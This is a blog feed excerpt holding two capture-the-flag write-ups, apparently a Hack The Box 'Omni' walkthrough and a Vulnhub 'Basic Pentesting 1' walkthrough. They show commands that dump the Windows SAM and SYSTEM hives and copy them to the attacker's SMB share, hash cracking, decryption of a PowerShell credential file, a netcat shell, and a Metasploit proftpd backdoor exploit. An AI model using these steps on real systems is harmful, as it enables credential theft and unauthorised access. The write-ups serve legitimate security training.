&lt;p&gt;I thought since we have access to Administrator directory, what about SAM and SYSTEM files? We have access to them too?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SAM - The Security Account Manager is a database file in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users‚Äô passwords.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;SYSTEM - The Windows Registry is a hierarchical database that stores low-level settings for the Microsoft Windows operating system and for applications that opt to use the Registry.&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://pure.security/dumping-windows-credentials/&quot;&gt;https://pure.security/dumping-windows-credentials/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And Yes we have access to them. Copied them to the app directory. Now I need to copy this to my machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; reg.exe save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;am
PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; reg.exe save hklm&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I setup SMB Server in my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%205.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%205.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Copied the files to my machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; net use z: &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.30&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ub /user:wolf wolf
PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; copy sam &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.30&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ub
copy sam &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.30&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ub
PS C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt; copy system &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.30&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ub
copy system &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.30&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are various tools to dump the hashes, I used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump.py&lt;/code&gt; and I got some hashes. We are Interested in Administrator and app hashes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%206.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%206.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I cracked the hashes using JTR and I got user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app&lt;/code&gt; hash.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%207.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%207.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We know Windows Device Portal running on Port 8080 and its asking for credentials. This time I used this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app : mesh5143&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%208.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%208.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged into the dashboard. I started checking each and every tabs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%209.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%209.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is an option to Run Command, We have already uploaded our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; so I used the same one to get a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2010.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2010.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This time I don‚Äôt have access to the Administrator‚Äôs directory.&lt;/p&gt;

&lt;p&gt;And now I‚Äôm able to decrypt the file and got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iot-admin.xml&lt;/code&gt; it contains some password. And I used the same method to decrypt the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and got user flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt;powershell.exe &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=Import-CliXml -Path C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ata&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ot-admin.xml; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetNetworkCredential().Password&quot;&lt;/span&gt;
powershell.exe &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=Import-CliXml -Path C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ata&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ot-admin.xml; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.GetNetworkCredential().Password&quot;&lt;/span&gt;
Attempting to perform the InitializeDefaultDrives operation on the &lt;span class=&quot;s1&quot;&gt;'FileSystem'&lt;/span&gt; provider failed.
_1nt3rn37ofTh1nGz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We got one more file. And it seems useless.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ata&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp&amp;gt;type hardening.txt
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;hardening.txt
- changed default administrator password of &lt;span class=&quot;s2&quot;&gt;&quot;p@ssw0rd&quot;&lt;/span&gt;
- added firewall rules to restrict unnecessary services
- removed administrator account from &lt;span class=&quot;s2&quot;&gt;&quot;Ssh Users&quot;&lt;/span&gt; group
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Since we got a password from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iot-admin.xml&lt;/code&gt; the filename itself tells it is IOT Administrator password. I logged in as Administrator using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_1nt3rn37ofTh1nGz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2011.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2011.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We already know Run Command options is there. I used the same method we did before to get a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2012.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2012.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This time I have access to the Administrator‚Äôs directory and use the same method to decrypt the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2013.png&quot; alt=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-omni/Untitled%2013.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We Own the Box.&lt;/p&gt;</content><author><name>Girish</name></author><category term="IOT" /><category term="easy" /><category term="SirepRAT" /><summary type="html"></summary></entry><entry><title type="html">Vulnhub - Basic Pentesting 1</title><link href="http://localhost:4000/vulnhub/2019/10/23/BasicPentesting1Vulnhub/" rel="alternate" type="text/html" title="Vulnhub - Basic Pentesting 1" /><published>2019-10-23T00:00:00+05:30</published><updated>2019-10-23T00:00:00+05:30</updated><id>http://localhost:4000/vulnhub/2019/10/23/BasicPentesting1Vulnhub</id><content type="html" xml:base="http://localhost:4000/vulnhub/2019/10/23/BasicPentesting1Vulnhub/">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/1.1.jpg&quot; alt=&quot;&quot; /&gt;
Today, We are going to pwn Basic Pentesting 1 from Vulnhub&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;This is a small boot2root VM I created for my university‚Äôs cyber security group. It contains multiple remote vulnerabilities and multiple privilege escalation vectors. I did all of my testing for this VM on VirtualBox, so that‚Äôs the recommended platform. I have been informed that it also works with VMware, but I haven‚Äôt tested this personally.
 This VM is specifically intended for newcomers to penetration testing. If you‚Äôre a beginner, you should hopefully find the difficulty of the VM to be just right.
Your goal is to remotely attack the VM and gain root privileges. Once you‚Äôve finished, try to find other vectors you might have missed! If you enjoyed the VM or have questions, feel free to contact me at: josiah@vt.edu
If you finished the VM, please also consider posting a writeup! Writeups help you internalize what you worked on and help anyone else who might be struggling or wants to see someone else‚Äôs process. I look forward to reading them!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Download Link : &lt;a href=&quot;https://www.vulnhub.com/entry/basic-pentesting-1,216/#download&quot;&gt;https://www.vulnhub.com/entry/basic-pentesting-1,216/#download&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;lets-start-with-initial-scan&quot;&gt;Lets Start with Initial Scan&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan-results&quot;&gt;Nmap Scan Results&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since there is a HTTP port open lets start our Gobuster&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets check the webpage to find any vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/5.png&quot; alt=&quot;&quot; /&gt;
Nothing Usefull, So lets have a look on&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;/secret&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since it is Wordpress we can use wpscan to find vulnerable plugins or users.
&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We found a user called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h2&gt;

&lt;p&gt;Btw We found a FTP port open so we can try anonymous login
&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anonymous login Failed&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;But FTP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proftpd 1.3.3c&lt;/code&gt; looks like vulnerable&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;yes it is and there is a metasploit exploit!!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/basic_pentesting1/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got the root itself!!!&lt;/p&gt;</content><author><name>Girish</name></author><category term="ftp" /><category term="wordpress" /><category term="easy" /><summary type="html">Today, We are going to pwn Basic Pentesting 1 from Vulnhub</summary></entry></feed>